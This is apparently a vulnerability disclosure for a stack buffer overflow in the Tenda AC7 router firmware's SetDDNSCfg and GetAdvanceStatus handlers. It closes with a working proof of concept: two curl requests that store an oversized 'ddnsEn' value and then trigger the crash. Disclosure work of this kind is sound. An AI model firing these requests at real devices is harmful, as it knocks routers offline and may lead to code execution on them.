## Overview

The Tenda AC7 firmware contains a stack-based buffer overflow vulnerability in the `POST /goform/SetDDNSCfg` endpoint. The handler processes the `ddnsEn` parameter from the POST request, assigns it to a local variable, and stores it using `SetValue("adv.ddns1.en", Var)`. The stored value is later retrieved via `GetValue("adv.ddns1.en", v29)` in the `GET /goform/GetAdvanceStatus` function. Because neither `SetValue` nor `GetValue` implement input length validation, an excessively long `ddnsEn` value can overflow the fixed-size stack buffer `v29` when copied, resulting in a crash or potentially allowing arbitrary code execution.

## Affected product & version

- Product: Tenda AC7 (firmware published on Tenda support site)
- Affected firmware version: **V15.03.06.44**

## Vendor download page

https://www.tenda.com.cn/product/download/AC7.html

## Technical details

**Write path:** `POST /goform/SetDDNSCfg` — reads `ddnsEn` into a local variable and persists it with `SetValue("adv.ddns1.en", Var)`.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_152948.png)

**Read path:** `GET /goform/GetAdvanceStatus` — invokes `GetValue("adv.ddns1.en", v29)` (the retrieved value is copied into the fixed-size stack buffer `v29`).

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_153102.png)

**Root cause:** `SetValue`/`GetValue` do not validate or bound stored string lengths; consumers assume values fit destination buffers and perform unchecked copies.

## Exploit

1. Send a POST to `/goform/SetDDNSCfg` with a malicious `ddnsEn` payload.

```
curl -s -X POST \
  http://192.168.0.1/goform/SetDDNSCfg \
  -d 'ddnsEn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

2. Trigger Stack Overflow Vulnerability through the `/goform/GetAdvanceStatus` interface.

```
curl -s -X POST \
  http://192.168.0.1/goform/GetAdvanceStatus
```

3. Successfully triggered attack

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_091337.png)